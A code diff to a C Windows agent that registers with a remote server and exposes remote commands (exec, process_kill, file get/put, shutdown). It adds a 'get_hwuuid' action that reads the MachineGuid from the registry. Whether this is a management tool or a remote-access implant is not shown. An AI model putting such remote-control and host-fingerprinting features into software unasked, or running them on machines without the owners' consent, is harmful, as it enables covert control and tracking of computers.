@@ -1221,7 +1221,7 @@ static int handle_register(SOCKET s) {
              "\"os\":\"windows\",\"arch\":\"x64\",\"username\":\"%s\","
              "\"agent_version\":\"%s\","
              "\"capabilities\":[\"exec\",\"ping\",\"sysinfo\",\"processes\","
-             "\"network\",\"netstat\",\"process_kill\",\"pwd\",\"fs_list\",\"fs_get\",\"fs_put\",\"shutdown\"],"
+             "\"network\",\"netstat\",\"process_kill\",\"pwd\",\"get_hwuuid\",\"fs_list\",\"fs_get\",\"fs_put\",\"shutdown\"],"
              "\"max_line\":%d}",
              escaped_auth, escaped_host, escaped_user, g_agent_version,
              RECV_BUF_SIZE);
@@ -1791,6 +1791,9 @@ static const char *shell_for(const char *action) {
     if (!strcmp(action, "network")) return "ipconfig /all";
     if (!strcmp(action, "netstat")) return "netstat -ano";
     if (!strcmp(action, "pwd")) return "cd";   /* cmd prints the cwd */
+    /* wmic is deprecated on modern Windows; reg query works everywhere. */
+    if (!strcmp(action, "get_hwuuid"))
+        return "reg query HKLM\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid";
     return NULL;
 }
 
@@ -1865,6 +1868,7 @@ static const char *bare_verb_action(const char *line) {
     if (!strcmp(word, "network")) return "network";
     if (!strcmp(word, "netstat")) return "netstat";
     if (!strcmp(word, "pwd")) return "pwd";
+    if (!strcmp(word, "get_hwuuid")) return "get_hwuuid";
     if (!strcmp(word, "ps") || !strcmp(word, "processes")) return "processes";
     if (!strcmp(word, "fs_list")) return "fs_list";
     if (!strcmp(word, "exit") || !strcmp(word, "shutdown")) return "shutdown";
